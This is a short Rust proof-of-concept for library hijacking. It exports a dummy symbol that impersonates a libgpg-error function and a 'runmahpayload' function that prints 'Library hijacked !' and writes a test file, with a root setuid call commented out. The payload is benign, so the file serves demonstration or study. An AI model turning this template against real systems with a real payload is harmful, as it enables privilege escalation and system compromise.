//use nix::unistd;
use std::fs;
use std::io::prelude::*;

pub static gpgrt_lock_lock: i16 = 0;

#[no_mangle]
pub fn runmahpayload() -> (){
//    setuid(ROOT);
    println!("Library hijacked !");
    let _ = write();
}

fn write() -> std::io::Result<()> {
    let mut file = fs::File::create("test.txt")?;
    file.write_all(b"Hello, world!")?;
    Ok(())
}